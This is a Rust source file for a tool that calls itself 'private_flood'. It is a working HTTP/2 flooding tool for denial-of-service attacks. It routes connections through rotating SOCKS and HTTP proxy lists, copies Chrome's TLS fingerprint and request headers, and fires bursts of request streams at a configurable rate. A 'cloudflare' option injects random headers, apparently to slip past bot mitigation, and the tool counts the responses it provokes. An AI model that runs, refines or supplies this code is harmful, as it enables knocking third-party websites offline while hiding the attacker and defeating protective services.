use std::{ process::exit, time::Duration };
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;
use chrono::Local;
use rand::Rng;
use tokio::runtime::Builder;
use boring::ssl::{
    ConnectConfiguration,
    SslConnector,
    SslMethod,
    SslOptions,
    SslSignatureAlgorithm,
};
use tokio::{ fs::File, io::{ self, AsyncReadExt, AsyncWriteExt, BufReader }, net::TcpStream };
use tokio::io::AsyncBufReadExt;
use futures::{ stream::FuturesUnordered, StreamExt };
use tokio_boring::SslStream;
use url::Url;
use clap::Parser;
use httlib_hpack::{ Encoder, Decoder };
use rand::distributions::{ Distribution, Uniform };

static mut M: u8 = 0;
static mut RATE: u64 = 0;
static mut CLOUDFLARE: Option<bool> = None;
static mut USER_AGENT: Option<String> = None;
static mut COOKIE: Option<String> = None;
static mut PLATFORM: Option<String> = None;
static mut SEC_CH_UA: Option<String> = None;
static mut REFERER: Option<String> = None;
static mut MODE: Option<String> = None;

#[derive(Parser, Debug)]
#[command(version, about, long_about = "private_flood 2024 04 09")]
struct Args {
    #[arg(long, short = 'u')]
    target: String,

    #[arg(long, short = 'n')]
    connections: usize,

    #[arg(long, short = 'r')]
    rate: u64,

    #[arg(long, short = 'm')]
    streams: u8,

    #[arg(long, short = 't')]
    threads: usize,

    #[arg(long, short = 's')]
    time: u32,

    #[arg(long, short = 'p')]
    proxy: String,

    #[arg(long)]
    cloudflare: bool,

    #[arg(long)]
    browser: bool,

    #[arg(long)]
    useragent: Option<String>,

    #[arg(long)]
    cookie: Option<String>,

    #[arg(long)]
    platform: Option<String>,

    #[arg(long)]
    chsecua: Option<String>,

    #[arg(long)]
    referer: Option<String>,

    #[arg(long)]
    mode: Option<String>,
}

const PREFACE: &[u8; 24] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const SETTINGS_FRAME: u8 = 4;
const HEADERS_FRAME: u8 = 1;
const WINDOW_FRAME: u8 = 8;

const SETTINGS_HEADER_TABLE_SIZE: u16 = 1;
const SETTINGS_ENABLE_PUSH: u16 = 2;
const SETTINGS_INITIAL_WINDOW_SIZE: u16 = 4;
const SETTINGS_MAX_HEADER_LIST_SIZE: u16 = 6;

fn construct_frame(t: u8, f: u8, s: u32, p: Vec<u8>) -> Vec<u8> {
    let payload_length = p.len();
    if payload_length > 0xffffff {
        panic!("Payload too large");
    }

    let mut frame = Vec::with_capacity(9 + payload_length);
    frame.extend_from_slice(
        &[
            ((payload_length >> 16) & 0xff) as u8,
            ((payload_length >> 8) & 0xff) as u8,
            (payload_length & 0xff) as u8,
        ]
    );

    frame.push(t);
    frame.push(f);
    let stream_id = s & 0x7fffffff;
    frame.extend_from_slice(&stream_id.to_be_bytes());
    frame.extend(p);
    frame
}

fn settings_frame(id: u16, value: u32) -> Vec<u8> {
    let mut result = Vec::new();
    result.extend_from_slice(&id.to_be_bytes());
    result.extend_from_slice(&value.to_be_bytes());
    result
}

fn get_ssl_builder() -> SslConnector {
    let mut builder = SslConnector::builder(SslMethod::tls()).unwrap();
    builder.set_options(
        SslOptions::NO_SSLV2 | SslOptions::NO_SSLV3 | SslOptions::NO_TLSV1 | SslOptions::NO_TLSV1_1
    );
    builder
        .set_cipher_list(
            "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:\
        TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:\
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_CHACHA20_POLY_SHA256:\
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:\
        TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_GCM_SHA256:\
        TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_CBC_SHA"
        )
        .unwrap();
    builder.set_alpn_protos(b"\x02h2\x08http/1.1").unwrap();
    builder.set_grease_enabled(true);

    let signature_algorithms =
        vec![
        SslSignatureAlgorithm::ECDSA_SECP256R1_SHA256,
        SslSignatureAlgorithm::RSA_PSS_RSAE_SHA256,
        SslSignatureAlgorithm::RSA_PKCS1_SHA256,
        SslSignatureAlgorithm::ECDSA_SECP384R1_SHA384,
        SslSignatureAlgorithm::RSA_PSS_RSAE_SHA384,
        SslSignatureAlgorithm::RSA_PKCS1_SHA384,
        SslSignatureAlgorithm::RSA_PSS_RSAE_SHA512,
        SslSignatureAlgorithm::RSA_PKCS1_SHA512,
    ];

    if let Err(e) = builder.set_verify_algorithm_prefs(&signature_algorithms) {
        eprintln!("Error setting verify algorithm preferences: {:?}", e);
    }

    builder.build()
}

fn get_ssl_config(connector: SslConnector) -> ConnectConfiguration {
    let mut connect_config = connector.configure().unwrap();
    connect_config.set_verify_hostname(false);
    connect_config
}

async fn connect_via_proxy(proxy: &str, target_addr: &str) -> io::Result<TcpStream> {
    let url = Url::parse(proxy).expect("Invalid proxy URL");
    let proxy_host = url.host_str().unwrap();
    let proxy_port = url.port().unwrap_or(8080);
    let proxy_type = url.scheme();

    match proxy_type {
        "socks4" => {
            let mut stream = TcpStream::connect((proxy_host, proxy_port)).await?;
            let mut s4_req = vec![0x04, 0x01];
            s4_req.extend_from_slice(&(443u16).to_be_bytes());
            s4_req.extend_from_slice(&[0x00, 0x00, 0x00, 0x01, 0x00]);
            s4_req.extend_from_slice(target_addr.as_bytes());
            s4_req.push(0x00);

            stream.write_all(&s4_req).await?;
            let mut response = [0; 8];
            stream.read_exact(&mut response).await?;

            if response[1] == 0x5a {
                Ok(stream)
            } else {
                Err(io::Error::new(io::ErrorKind::Other, "Failed to connect through SOCKS4 proxy"))
            }
        }
        "socks5" => {
            let mut stream = TcpStream::connect((proxy_host, proxy_port)).await?;
            stream.write_all(&[0x05, 0x01, 0x00]).await?;
            let mut response = [0; 2];
            stream.read_exact(&mut response).await?;

            if response[0] != 0x05 || response[1] != 0x00 {
                return Err(
                    io::Error::new(io::ErrorKind::Other, "Failed to connect through SOCKS5 proxy")
                );
            }

            let mut s5_req = vec![0x05, 0x01, 0x00, 0x03];
            s5_req.push(target_addr.len() as u8);
            s5_req.extend_from_slice(target_addr.as_bytes());
            s5_req.extend_from_slice(&(443u16).to_be_bytes());

            stream.write_all(&s5_req).await?;
            let mut response = [0; 10];
            stream.read_exact(&mut response).await?;

            if response[1] == 0x00 {
                Ok(stream)
            } else {
                Err(io::Error::new(io::ErrorKind::Other, "Failed to connect through SOCKS5 proxy"))
            }
        }
        "http" => {
            let mut stream = TcpStream::connect((proxy_host, proxy_port)).await?;
            let connect_request =
                format!("CONNECT {} HTTP/1.1\r\nHost: {}\r\n\r\n", target_addr, target_addr);

            stream.write_all(connect_request.as_bytes()).await?;
            let mut buffer = [0; 1024];
            let n = stream.read(&mut buffer).await?;
            let response = String::from_utf8_lossy(&buffer[..n]);

            if response.contains("200 ") {
                Ok(stream)
            } else {
                Err(io::Error::new(io::ErrorKind::Other, "Failed to connect through HTTP proxy"))
            }
        }
        _ => Err(io::Error::new(io::ErrorKind::InvalidInput, "Unsupported proxy type")),
    }
}

async fn read_lines_from_file(path: String) -> io::Result<Vec<String>> {
    let file = File::open(path).await?;

    let reader = BufReader::new(file);

    let mut lines = reader.lines();
    let mut results = Vec::new();

    while let Some(line) = lines.next_line().await? {
        results.push(line);
    }

    Ok(results)
}

struct Connection<'a> {
    r: u32,
    url: Url,
    domain: String,
    proxy: String,
    stream: Option<TcpStream>,
    tls_stream: Option<SslStream<TcpStream>>,
    s: u32,
    ssl_builder: SslConnector,
    e: Encoder<'a>,
    d: Decoder<'a>,
    buf: Vec<u8>,
    status_codes: Arc<Mutex<HashMap<String, u32>>>,
}

impl<'a> Connection<'a> {
    fn new(
        url: Url,
        proxy: String,
        ssl_builder: SslConnector,
        status_codes: Arc<Mutex<HashMap<String, u32>>>
    ) -> Connection<'a> {
        Connection {
            r: 0,
            url: url.clone(),
            domain: url.domain().unwrap().to_string(),
            proxy,
            stream: None,
            tls_stream: None,
            s: 0,
            ssl_builder,
            e: Encoder::with_dynamic_size(4096),
            d: Decoder::with_dynamic_size(4096),
            buf: vec![],
            status_codes,
        }
    }

    async fn do_connect(&mut self) {
        let host = self.url.host_str().unwrap();
        let port = self.url.port_or_known_default().unwrap();
        let target_addr = format!("{}:{}", host, port);
        let stream = connect_via_proxy(&self.proxy, target_addr.as_str()).await;
        match stream {
            Ok(stream) => {
                self.stream = Some(stream);
            }
            _ => {}
        }
    }

    async fn do_handshake(&mut self) {
        if let Some(stream) = self.stream.take() {
            let tls_stream = tokio_boring::connect(
                get_ssl_config(self.ssl_builder.clone()),
                &self.domain,
                stream
            ).await;
            if let Ok(mut tls_stream) = tls_stream {
                if tls_stream.write(PREFACE).await.is_err() {
                    return;
                }
                if
                    tls_stream
                        .write(
                            construct_frame(
                                SETTINGS_FRAME,
                                0,
                                0,
                                [
                                    settings_frame(SETTINGS_HEADER_TABLE_SIZE, 65536),
                                    settings_frame(SETTINGS_ENABLE_PUSH, 0),
                                    settings_frame(SETTINGS_INITIAL_WINDOW_SIZE, 62125456),
                                    settings_frame(SETTINGS_MAX_HEADER_LIST_SIZE, 262144),
                                ].concat()
                            ).as_slice()
                        ).await
                        .is_err()
                {
                    return;
                }
                if
                    tls_stream
                        .write(
                            construct_frame(
                                WINDOW_FRAME,
                                0,
                                0,
                                (15663105 as u32).to_be_bytes().to_vec()
                            ).as_slice()
                        ).await
                        .is_err()
                {
                    return;
                }
                self.tls_stream = Some(tls_stream);
                self.s = 1;
            }
        }
    }

    fn encode(&mut self, dst: &mut Vec<u8>, name: Vec<u8>, value: Vec<u8>) {
        let flags = 0x2 | 0x4 | 0x10;
        self.e.encode((name, value, flags), dst).unwrap();
    }

    async fn do_request(&mut self) {
        if let Some(mut tls_stream) = self.tls_stream.take() {
            let mut bytes = vec![];
            for _i in 0..(unsafe { M }) {
                let mut dst = Vec::new();
                let mut rng = rand::thread_rng();
                let char_range = Uniform::from(b'a'..=b'z');
                let random_string: Vec<u8> = (0..10).map(|_| char_range.sample(&mut rng)).collect();
                let random = rng.gen_range(122..=125);

                let sec_ua = unsafe {
                    SEC_CH_UA.clone()
                        .filter(|ua| ua != "None")
                        .unwrap_or_else(||
                            format!(r#""Google Chrome";v="{}", "Chromium";v="{}", "Not.A/Brand";v="24""#, random, random)
                        )
                };

                let ua = unsafe {
                    USER_AGENT.clone()
                        .filter(|ua| ua != "None")
                        .unwrap_or_else(||
                            format!(r#"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36"#, random)
                        )
                };

                let platform = unsafe {
                    PLATFORM.clone()
                        .filter(|platform| platform != "None")
                        .unwrap_or_else(|| "Windows".to_string())
                };

                let mode = unsafe { MODE.clone().unwrap_or_else(|| "GET".to_string()) };

                self.encode(&mut dst, b":method".to_vec(), mode.as_bytes().to_vec());
                self.encode(&mut dst, b":authority".to_vec(), self.domain.as_bytes().to_vec());
                self.encode(&mut dst, b":scheme".to_vec(), b"https".to_vec());
                self.encode(&mut dst, b":path".to_vec(), self.url.path().as_bytes().to_vec());
                self.encode(&mut dst, b"sec-ch-ua".to_vec(), sec_ua.as_bytes().to_vec());
                self.encode(&mut dst, b"sec-ch-ua-mobile".to_vec(), b"?0".to_vec());
                self.encode(&mut dst, b"sec-ch-ua-platform".to_vec(), platform.as_bytes().to_vec());
                self.encode(&mut dst, b"upgrade-insecure-requests".to_vec(), b"1".to_vec());
                self.encode(&mut dst, b"user-agent".to_vec(), ua.as_bytes().to_vec());
                self.encode(
                    &mut dst,
                    b"accept".to_vec(),
                    b"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7".to_vec()
                );
                self.encode(&mut dst, b"sec-fetch-site".to_vec(), b"none".to_vec());
                self.encode(&mut dst, b"sec-fetch-mode".to_vec(), b"navigate".to_vec());
                self.encode(&mut dst, b"sec-fetch-user".to_vec(), b"?1".to_vec());
                self.encode(&mut dst, b"sec-fetch-dest".to_vec(), b"document".to_vec());
                self.encode(
                    &mut dst,
                    b"accept-encoding".to_vec(),
                    b"gzip, deflate, br, zstd".to_vec()
                );
                self.encode(&mut dst, b"accept-language".to_vec(), b"fr-FR,fr;q=0.7".to_vec());

                if let Some(referer) = (unsafe { REFERER.clone() }) {
                    self.encode(&mut dst, b"referer".to_vec(), referer.as_bytes().to_vec());
                }

                if let Some(cookie) = (unsafe { COOKIE.clone() }) {
                    self.encode(&mut dst, b"cookie".to_vec(), cookie.as_bytes().to_vec());
                }

                if let Some(true) = (unsafe { CLOUDFLARE }) {
                    if rand::random::<f64>() < 0.5 {
                        self.encode(&mut dst, b"sec-stake".to_vec(), random_string.clone());
                    }

                    if rand::random::<f64>() < 0.5 {
                        self.encode(&mut dst, b"sec-x-wegr-sdf".to_vec(), random_string.clone());
                    }

                    if rand::random::<f64>() < 0.5 {
                        self.encode(&mut dst, b"x-sdg-wefgf".to_vec(), random_string.clone());
                    }

                    if rand::random::<f64>() < 0.5 {
                        self.encode(&mut dst, b"x-cetrs".to_vec(), random_string.clone());
                    }
                }

                let frame = construct_frame(HEADERS_FRAME, 4 | 1, self.s, dst);
                bytes.push(frame);
                self.s += 2;
            }

            match tls_stream.write(&bytes.as_slice().concat()).await {
                Ok(size) => {
                    tokio::time::sleep(
                        tokio::time::Duration::from_micros(1_000_000 / (unsafe { RATE }))
                    ).await;
                    self.tls_stream = Some(tls_stream);
                }
                Err(e) => {
                    println!("Failed to send request: {:?}", e);
                }
            }
        }
        self.r += 1;
        self.e = Encoder::with_dynamic_size(4096);
    }

    async fn do_response(&mut self) {
        if let Some(tls_stream) = self.tls_stream.take() {
            let tls_stream = Arc::new(Mutex::new(tls_stream));
            let mut should_exit = false;

            while !should_exit {
                let mut tls_stream_guard = tls_stream.lock().await;
                let read_result = tls_stream_guard.read(&mut self.buf).await;

                if let Ok(0) = read_result {
                    let mut status_codes = self.status_codes.lock().await;
                    *status_codes.entry("CLOSE".to_string()).or_insert(0) += 1;
                    should_exit = true;
                }

                if read_result.is_err() {
                    should_exit = true;
                }

                while self.buf.len() >= 9 {
                    let type_and_length = u32::from_be_bytes(self.buf[0..4].try_into().unwrap());
                    let t = type_and_length & 0xff;

                    if t == 7 {
                        let mut status_codes = self.status_codes.lock().await;
                        *status_codes.entry("GOAWAY".to_string()).or_insert(0) += 1;
                        should_exit = true;
                        break;
                    }

                    if t == 4 && self.buf[4] == 0 {
                        if
                            tls_stream_guard
                                .write(&construct_frame(SETTINGS_FRAME, 1, 0, vec![])).await
                                .is_err()
                        {
                            should_exit = true;
                            break;
                        }
                    }

                    let length: usize = (type_and_length as usize) >> 8;
                    if self.buf.len() < 9 + length {
                        break;
                    }

                    let frame = &self.buf[9..9 + length];

                    if t == 1 {
                        let mut headers = Vec::new();
                        if self.d.decode(&mut frame.to_vec(), &mut headers).is_err() {
                            should_exit = true;
                            break;
                        }

                        let status = headers
                            .iter()
                            .find(|x| x.0 == b":status")
                            .map(|x| String::from_utf8_lossy(&x.1).to_string())
                            .unwrap_or_default();

                        let mut status_codes = self.status_codes.lock().await;
                        *status_codes.entry(status.clone()).or_insert(0) += 1;
                    }
                    self.buf.drain(0..9usize + length);
                }
                drop(tls_stream_guard);
            }

            self.tls_stream = Some(Arc::try_unwrap(tls_stream).unwrap().into_inner());
        }
    }

    async fn handle(mut self) -> Self {
        if self.stream.is_none() && self.tls_stream.is_none() {
            self.do_connect().await;
        } else if self.tls_stream.is_none() {
            self.do_handshake().await;
        } else if self.tls_stream.is_some() {
            self.do_request().await;
            self.do_response().await;
        } else {
            println!("LOX CRASH");
            assert!(false);
        }

        self
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    println!("@mitigationser");
    let mut cores = num_cpus::get();

    unsafe {
        M = args.streams;
        RATE = args.rate;
        USER_AGENT = Some(args.useragent.unwrap_or_else(|| "None".to_string()));
        COOKIE = Some(args.cookie.unwrap_or_else(|| "None".to_string()));
        PLATFORM = Some(args.platform.unwrap_or_else(|| "None".to_string()));
        SEC_CH_UA = Some(args.chsecua.unwrap_or_else(|| "None".to_string()));
        CLOUDFLARE = Some(args.cloudflare);
        REFERER = Some(args.referer.unwrap_or_else(|| "None".to_string()));
        MODE = Some(args.mode.unwrap_or_else(|| "GET".to_string()));
    }

    println!(
        "Host: {:?}\nRate: {}\nUser-agent: {}\nCookie: {}\nPlatform: {}\nSec-ch-ua: {}\nCloudflare: {}\nReferer: {}\nMode: {}",
        args.target,
        unsafe { RATE },
        unsafe { &USER_AGENT }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
        unsafe { &COOKIE }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
        unsafe { &PLATFORM }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
        unsafe { &SEC_CH_UA }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
        unsafe { CLOUDFLARE }.map(|cf| if cf { "true" } else { "false" }).unwrap_or_default(),
        unsafe { &REFERER }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
        unsafe { &MODE }.as_ref().map(|s| s.as_str()).unwrap_or_default(),
    );

    if args.threads < cores {
        cores = args.threads;
    }

    let rt = Builder::new_multi_thread().worker_threads(cores).enable_all().build().unwrap();

    rt.block_on(async {
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_secs(args.time.into())).await;
            exit(0);
        });

        let status_codes = Arc::new(Mutex::new(HashMap::new()));
        let mut tasks = vec![];
        for j in 0..cores {
            let proxies;
            if args.browser {
                proxies = vec![args.proxy.clone()];
            } else {
                proxies = read_lines_from_file(args.proxy.clone()).await.unwrap();
            }
            let connections = args.connections;
            let target = args.target.clone();
            let status_codes_clone = Arc::clone(&status_codes);
            let task = rt.spawn(async move {
                let ssl_builder = get_ssl_builder();
                let mut tasks = FuturesUnordered::new();
                let mut x = 0;
                let mut conns = vec![];

                for _c in 0..connections {
                    let proxy = proxies.get(x).unwrap();
                    x += 1;

                    if x == proxies.len() {
                        x = 0;
                    }
                    conns.push(
                        Connection::new(
                            Url::parse(&target).unwrap(),
                            proxy.to_string(),
                            ssl_builder.clone(),
                            Arc::clone(&status_codes_clone)
                        )
                    );
                }

                for c in conns {
                    tasks.push(c.handle());
                }
                println!("h2r | Thread {}", j);

                while let Some(result) = tasks.next().await {
                    let c = result;
                    tasks.push(c.handle());
                }
                tasks.clear();
            });
            tasks.push(task);
        }

        let status_codes_clone = Arc::clone(&status_codes);
        tokio::spawn(async move {
            loop {
                {
                    let status_codes = status_codes_clone.lock().await;
                    let current_time = Local::now().format("%H:%M:%S").to_string();
                    let status_summary: Vec<String> = status_codes
                        .iter()
                        .map(|(k, v)| format!("{}: {}", k, v))
                        .collect();
                    println!("[ {} | RUST FLD ] -- [ {} ]", current_time, status_summary.join(", "));
                }
                tokio::time::sleep(Duration::from_secs(1)).await;
            }
        });

        for t in tasks {
            t.await.unwrap();
        }
    });

    Ok(())
}